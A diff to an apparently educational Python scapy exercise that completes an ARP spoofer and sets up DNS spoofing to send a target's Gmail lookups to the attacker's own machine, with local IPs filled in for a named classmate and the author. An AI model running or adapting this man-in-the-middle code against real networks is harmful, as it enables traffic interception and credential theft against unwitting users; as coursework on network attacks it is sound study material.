@@ -5,12 +5,12 @@ from scapy.layers.dns import DNS, DNSQR, DNSRR, IP, sr1, UDP
 import scapy.all as scapy
 import time
 
-DOOFENSHMIRTZ_IP = "???"  # Enter the computer you attack's IP.
-SECRATERY_IP = "???"  # Enter the attacker's IP.
-NETWORK_DNS_SERVER_IP = "???"  # Enter the network's DNS server's IP.
+DOOFENSHMIRTZ_IP = "132.64.142.16"  # Erel IP
+SECRATERY_IP = "132.64.142.61"  # My IP
+NETWORK_DNS_SERVER_IP = "216.58.214.4"  # Enter the network's DNS server's IP.
 SPOOF_SLEEP_TIME = 2
 
-IFACE = "???"  # Enter the network interface you work on.
+IFACE = "Ethernet adapter Ethernet"  # Enter the network interface you work on.
 
 FAKE_GMAIL_IP = SECRATERY_IP  # The ip on which we run
 DNS_FILTER = f"udp port 53 and ip src {DOOFENSHMIRTZ_IP} and ip dst {NETWORK_DNS_SERVER_IP}"  # Scapy filter
@@ -56,9 +56,11 @@ class ArpSpoofer(object):
         """
         Sends an ARP spoof that convinces target_ip that we are spoof_ip.
         Increases spoof count b y one.
-        """        
+        """
 
-        # Your code here...
+        packet = ARP(op=2, pdst=self.target_ip, hwdst=self.get_target_mac(), psrc=self.spoof_ip)
+
+        scapy.send(packet)  # TODO: Verbose off
 
         self.spoof_count += 1
 
